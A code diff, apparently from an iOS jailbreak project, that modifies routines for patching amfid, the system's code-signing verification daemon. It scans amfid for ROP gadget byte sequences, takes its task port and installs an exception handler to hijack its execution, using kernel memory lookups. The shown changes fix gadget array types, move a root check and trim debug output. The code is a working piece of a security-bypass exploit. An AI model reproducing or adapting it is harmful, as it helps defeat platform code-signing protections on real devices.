@@ -112,19 +112,19 @@ uint64_t find_amfid_OFFSET_gadget(uint8_t *amfid_macho){
     unsigned long sect_size = 0;
     uint64_t sect_data = (uint64_t)getsectiondata((const struct mach_header_64 *)amfid_macho, _segment, _section, &sect_size);
     
-    uint64_t _bytes_gadget[] = {
+    unsigned char _bytes_gadget[] = {
         0x08, 0x29, 0x09, 0x9B, // madd        x8, x8, x9, x10
         0x00, 0x15, 0x40, 0xF9, // ldr         x0, [x8, #0x28]
         0xC0, 0x03, 0x5F, 0xD6, // ret
     };
     
-    uint64_t _bytes_gadget2[] = {
+    unsigned char _bytes_gadget2[] = {
         0x08, 0x25, 0x2A, 0x9B, // smaddl      x8, w8, w10, x9
         0x00, 0x15, 0x40, 0xF9, // ldr         x0, [x8, #0x28]
         0xC0, 0x03, 0x5F, 0xD6, // ret
     };
     
-    uint64_t _bytes_gadget3[] = {
+    unsigned char _bytes_gadget3[] = {
         0x08, 0xbd, 0x48, 0xca, // eor        x8, x8, x8, lsr #47
         0x00, 0x7d, 0x00, 0x9b, // mul        x0, x8, x9
         0xc0, 0x03, 0x5f, 0xd6, // ret
@@ -133,7 +133,6 @@ uint64_t find_amfid_OFFSET_gadget(uint8_t *amfid_macho){
     
     printf("-> Looking for needle #1");
     uint64_t find_gadget = (uint64_t)memmem((void*)sect_data, sect_size, &_bytes_gadget, sizeof(_bytes_gadget));
-    // util_hexprint((void*)sect_data, sect_size, "Amfid shitcache");
     printf("\t--->\t0x%llx\n", find_gadget);
     if(find_gadget == 0){
         printf("-> Looking for needle #2");
@@ -264,7 +263,7 @@ void set_exception_handler(mach_port_t amfid_task_port){
         return;
     }
     
-    printf("Attempting to set exception handler...\t(0x%x)\n", amfid_task_port);
+    printf("Attempting to set exception handler...\t(0x%x --> 0x%x)\n", amfid_exception_port, amfid_task_port);
     
     kern_return_t err = task_set_exception_ports(amfid_task_port,
                                                  EXC_MASK_ALL,
@@ -309,6 +308,7 @@ bool replace_amfid_port(){
 }
 
 kptr_t perform_amfid_patches(){
+    if(getuid() != 0) return 0;
     printf("* ------- AMFID Patches -------- *\n");
     uint8_t *amfid_fdata = map_file_to_mem("/usr/libexec/amfid");
     printf("Extracted AMFID Offsets:\n");
@@ -326,14 +326,12 @@ kptr_t perform_amfid_patches(){
     
     /** Swap Spindump creds with local ones */
     // safepatch_swap_spindump_cred(g_exp.self_proc);
-    if(getuid() != 0) return 1;
+
     kern_return_t ret = host_get_amfid_port(mach_host_self(), &amfid_task_port);
     if(ret == KERN_SUCCESS){
         kptr_t amfid_ipc_entry = ipc_entry_lookup(amfid_task_port);
         printf("\namfid task:\t0x%llx\t\t(from proc)\n", kproc_find_by_pid(amfid_pid) + OFFSET(proc, task));
-        printf("ipc entry: 0x%llx\n", amfid_ipc_entry);
-        printf("ip_kobject : 0x%llx\n", port_name_to_ipc_port(amfid_task_port));
-        debug_dump_ipc_port(amfid_task_port, &amfid_ipc_entry);
+        // debug_dump_ipc_port(amfid_task_port, &amfid_ipc_entry);
         printf("amfid port:\t0x%x\n", amfid_task_port);
         set_exception_handler(amfid_task_port);
         kptr_t amfid_base = binary_load_address(amfid_task_port);
